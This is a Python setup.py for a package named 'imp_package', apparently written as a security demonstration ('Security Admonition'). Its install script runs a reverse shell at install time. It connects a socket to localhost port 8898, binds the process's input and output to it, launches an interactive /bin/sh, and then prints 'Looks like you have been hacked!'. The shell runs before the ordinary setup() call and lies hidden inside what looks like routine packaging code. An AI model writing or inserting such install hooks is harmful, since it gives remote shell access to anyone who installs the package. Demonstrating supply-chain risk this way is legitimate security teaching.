import os
import socket
import subprocess
import sys
from distutils.core import setup


def run():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 8898))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

    long_description = "Looks like you have been hacked!"
    sys.stderr.write('\n' + long_description)

run()


setup(
    name='imp_package',
    version='0.0.1',
    description='Python Module Security Admonition',
    long_description="All is well!",
    author='Aadesh Bagmar',
    author_email='aadeshbagmar@gmail.com',
    url='',
    license='MIT',
    platforms=['OS Independent'],
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 3',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Security',
    ],
)
